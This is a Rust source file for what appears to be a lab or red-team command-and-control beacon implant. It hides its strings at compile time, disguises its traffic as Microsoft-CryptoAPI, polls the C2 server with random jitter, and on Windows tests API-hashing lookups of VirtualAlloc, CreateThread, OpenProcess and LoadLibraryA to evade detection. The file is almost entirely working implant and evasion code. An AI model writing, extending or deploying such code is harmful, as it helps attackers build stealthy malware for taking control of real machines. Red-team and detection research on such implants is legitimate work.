mod evasion;

use commun::{BeaconPing, BeaconPong};
use obfstr::obfstr;
use rand::Rng;
use reqwest::Client;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

fn now_ts() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

fn jitter_ms() -> u64 {
    rand::thread_rng().gen_range(0..4_000)
}

#[tokio::main]
async fn main() {
    // Windows only: validate EAT walks before entering beacon loop
    #[cfg(windows)]
    validate_evasion();

    // All strings obfuscated at compile time — no plaintext in .rdata
    let c2_url = format!(
        "{}://{}:{}{}",
        obfstr!("http"),
        obfstr!("127.0.0.1"), // change to 192.168.56.112 for lab
        8080u16,
        obfstr!("/ping"),
    );

    let client = Client::builder()
        .user_agent(obfstr!("Microsoft-CryptoAPI/10.0"))
        .timeout(Duration::from_secs(10))
        .build()
        .expect("http init");

    let mut beacon_id: u64 = 0;

    loop {
        beacon_id += 1;
        let ping = BeaconPing { id: beacon_id, ts: now_ts() };

        match client.post(&c2_url).json(&ping).send().await {
            Ok(resp) => match resp.json::<BeaconPong>().await {
                Ok(pong) => println!("[+] Pong #{} cmd={:?}", pong.id, pong.cmd),
                Err(e) => eprintln!("[-] JSON: {}", e),
            },
            Err(e) => eprintln!("[-] Beacon #{} err: {}", beacon_id, e),
        }

        tokio::time::sleep(Duration::from_millis(5_000 + jitter_ms())).await;
    }
}

#[cfg(windows)]
fn validate_evasion() {
    use evasion::api_hashing::{resolve, H_CREATE_THREAD, H_LOAD_LIBRARY_A, H_OPEN_PROCESS, H_VIRTUAL_ALLOC};
    unsafe {
        let _k32 = hide!("kernel32.dll\0");
        let _ntdll = hide!("ntdll.dll\0");
        let tests: &[(&str, Option<*const ()>)] = &[
            ("VirtualAlloc", resolve(b"kernel32.dll\0", H_VIRTUAL_ALLOC)),
            ("CreateThread", resolve(b"kernel32.dll\0", H_CREATE_THREAD)),
            ("OpenProcess",  resolve(b"kernel32.dll\0", H_OPEN_PROCESS)),
            ("LoadLibraryA", resolve(b"kernel32.dll\0", H_LOAD_LIBRARY_A)),
        ];
        for (name, ptr) in tests {
            assert!(ptr.is_some(), "EAT walk failed: {}", name);
        }
    }
}
